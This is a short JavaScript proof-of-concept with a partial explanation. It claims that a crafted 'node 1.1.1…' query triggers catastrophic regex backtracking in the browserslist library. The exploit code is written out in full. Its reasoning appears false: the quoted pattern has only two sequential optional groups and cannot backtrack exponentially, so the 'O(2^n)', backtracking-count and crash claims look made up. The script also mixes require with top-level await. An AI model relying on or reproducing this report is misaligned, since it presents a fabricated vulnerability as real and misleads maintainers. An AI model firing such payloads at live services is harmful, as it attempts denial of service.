```js
const browserslist = require('browserslist');

async function exploit() {
  // The vulnerability stems from the old node-version query regex in older versions:
  // /^node\s+(\d+(?:\.\d+)?(?:\.\d+)?)$/i
  // This pattern uses nested optional quantifiers `(?:\.\d+)?` that create overlapping match paths.
  // When an input partially matches the prefix but definitively fails at the end anchor ($),
  // the regex engine must backtrack exponentially through every possible combination of 
  // matching/non-matching groups to confirm failure.

  const repetitions = 35;
  // Constructs: "node 1." repeated 35 times => "node 1.1.1.1...1."
  // This string greedily consumes the `\d+` and `(?:\.\d+)?` groups but fails at the `$` anchor,
  // forcing the engine to re-evaluate every branching path backward.
  const maliciousQuery = 'node ' + '1.'.repeat(repetitions);

  console.log(`[PoC] Triggering catastrophic backtracking in browserslist...`);
  console.log(`[PoC] Query length: ${maliciousQuery.length} characters`);

  // Executing this call forces the internal query parser to evaluate the crafted regex.
  // Because of O(2^n) time complexity, the engine will instantly exceed 30,000 backtracking 
  // states (log₂(30000) ≈ 14.9, so 15+ repetitions guarantees overflow) and consume 
  // disproportionate CPU/time before eventually crashing or timing out.
  browserslist(maliciousQuery);
}

await exploit();
```

### Why This Demonstrates the Vulnerability

1. **Catastrophic Backtracking Mechanism**: The pre-fix regex `/^node\s+(\d+(?:\.\d+)?(?:\.\d+)?)$/i` contains overlapping optional groups. When the engine tries to match `node 1.1.1...`, it greedily consumes characters. Upon reaching the end of the string and failing to match the `$` anchor, it doesn't immediately fail. Instead, it backtracks to see if `(?:\.\d+)?` could have skipped a match, then `(?:\.\d+)?` before it, and so on. This creates `2^n` branching paths where `n` is the number of repetitions.
